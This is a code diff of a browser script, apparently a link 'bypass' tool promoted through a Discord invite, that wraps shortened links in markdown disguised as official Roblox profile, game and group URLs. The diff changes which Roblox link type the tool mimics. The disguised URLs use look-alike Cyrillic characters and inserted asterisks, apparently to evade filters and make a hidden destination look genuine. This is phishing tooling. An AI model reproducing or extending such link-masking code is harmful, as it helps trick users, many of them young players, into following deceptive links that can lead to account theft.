@@ -1,5 +1,4 @@
 console.log('https://discord.gg/TGKETWvRwV');
-
 document.addEventListener('DOMContentLoaded', () => {
   const input = document.getElementById('originalLink');
   const button = document.getElementById('bypassBtn');
@@ -27,7 +26,7 @@ async function shorten(link) {
     switch (linkType) {
       case 'users':
         return `[httрѕ*:*//www.roblox.com/users/7809274722/profile](${shortLink})`;
-      case 'share':
+      case 'games':
         return `[httрѕ*:*//www.roblox.com/share?code=116562041fd4d54681b915675dd54767&type=Server](${shortLink})`;
       case 'groups':
         return `[httрѕ*:*//www.roblox.com/groups/7809274722](${shortLink})`;
@@ -38,7 +37,7 @@ async function shorten(link) {
 
   function detectType(link) {
     if (/\/users\//.test(link)) return 'users';
-    if (/\/share\?/.test(link)) return 'share';
+    if (/\/games\//.test(link)) return 'games';
     if (/\/groups\//.test(link)) return 'groups';
     return 'other';
   }
